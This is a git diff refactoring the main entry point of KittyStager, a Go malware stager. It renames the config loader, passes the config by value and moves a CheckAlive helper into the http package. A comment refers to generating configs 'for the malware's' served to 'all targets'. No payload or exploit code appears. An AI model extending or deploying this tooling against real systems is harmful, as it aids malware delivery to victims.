@@ -4,7 +4,6 @@ import (
 	"KittyStager/cmd/cli"
 	"KittyStager/cmd/config"
 	"KittyStager/cmd/http"
-	"KittyStager/cmd/httpUtil"
 	"KittyStager/cmd/util"
 	"flag"
 	"fmt"
@@ -17,7 +16,7 @@ func main() {
 	fmt.Println(color.Cyan("                     _\n                    / )\n                   ( (\n     A.-.A  .-\"\"-.  ) )\n    / , , \\/      \\/ /\n   =\\  t  ;=    /   /\n     `--,'  .\"\"|   /\n         || |  \\\\ \\\n        ((,_|  ((,_\\\n"))
 	fmt.Println(color.Cyan("KittyStager - A simple stager written in Go\n"))
 	// Get the config
-	conf, err := config.GetConfig(*path)
+	conf, err := config.NewConfig(*path)
 	if err != nil {
 		util.ErrPrint(err)
 		return
@@ -31,7 +30,7 @@ func main() {
 	}
 	fmt.Println(color.Green("[+] Config loaded"))
 	// Generate config file for the malware's
-	err = util.GenerateConfig(conf)
+	err = util.GenerateConfig(*conf)
 	if err != nil {
 		util.ErrPrint(err)
 		return
@@ -41,8 +40,7 @@ func main() {
 	fmt.Printf("%s %d%s %s %s\n", color.Green("[+] Sleep set to"), color.Yellow(conf.GetSleep()), color.Yellow("s"), color.Green("on"), color.Yellow("all targets"))
 
 	// Start the http server
-
-	go http.CreateHttpServer(conf)
-	go httpUtil.CheckAlive()
-	cli.Cli(conf)
+	go http.CreateHttpServer(*conf)
+	go http.CheckAlive()
+	cli.Cli(*conf)
 }
